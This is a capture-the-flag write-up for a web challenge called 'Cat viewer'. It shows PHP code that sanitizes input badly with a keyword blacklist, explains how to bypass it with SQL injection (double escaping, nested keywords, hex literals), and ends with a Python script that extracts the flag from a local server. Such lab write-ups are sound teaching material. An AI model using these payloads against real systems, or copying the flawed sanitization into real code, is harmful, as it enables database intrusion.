# Cat viewer

## Description
Cats are beautiful, cats are cute, cats will take over the world :)

## Solution

### Overview
The intended solution involves exploiting a SQL Injection vulnerability in the image ID parameter and using the application as an oracle to reconstruct the flag. The `image_id` is directly embedded into the SQL query without prepared statements.

A manual sanitization is performed, but it’s flawed:

```php
$image_id = $_POST['id'];
$image_id = str_replace("'", "\\'", $image_id);
$image_id = str_replace('"', '\\"', $image_id);

$banned_keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE', 'DATABASE', 'SCHEMA', 'COLUMN', 'ALTER', 'CREATE', 'INDEX', 'TRIGGER', 'VIEW', 'SLEEP', 'BENCHMARK', 'LOAD_FILE'];

foreach ($banned_keywords as $keyword) {
    $image_id = str_ireplace($keyword, '', $image_id);
}

$sql = "SELECT url_image FROM images WHERE id_image = '" . $image_id . "' LIMIT 1";
```

### Exploitation Strategy
This sanitization can be bypassed in a very simple way:

- **String termination via double escaping**: We can terminate the original string by injecting a backslash followed by a single quote: ```\'``` (backslash + single quote). After the server-side replacement, it becomes ```\\'``` (double backslash + single quote), where the first backslash escapes the second one, and the single quote is treated as the actual end of the string literal.

- **Weak keyword filtering**: The blacklist removes exact keyword matches without checking for partial patterns. For instance, injecting something like UNUNIONION will have the substring UNION stripped out, and what's left will effectively reconstruct a valid UNION.

- **Hex encoding**: To return custom values from the query, we can inject hexadecimal string literals after SELECT. For example: ``` \' UNUNIONION SELSELECTECT 0x666C61677B -- -``` is equivalent to: ``` \' UNION SELECT 'flag{' -- - ```. This works because the initial escape (\' at the beginning) successfully breaks out of the original string. Using escaped quotes again later in the payload (e.g., around 'flag{') would result in malformed syntax like \\'flag{\\', so using hex encoding is safer and more reliable.

### Final Query
After sanitization and injection, the resulting SQL query becomes:
```sql
SELECT url_image FROM images WHERE id_image = '\\' UNION SELECT 'flag{...}' -- - LIMIT 1
```

## Exploit
```py
import requests
import string

url = "http://127.0.0.1:5003"
flag = "flag{"

while not flag.endswith("}"):
    for char in string.printable[:-6]:
        flag_guess = (flag + char).encode().hex()

        data = {"id": f"\\' UNUNIONION SELSELECTECT 0x{flag_guess} -- -"}

        resp = requests.post(url, data=data).text
        if "flag" in resp:
            flag += char
            print(flag)
            break
```
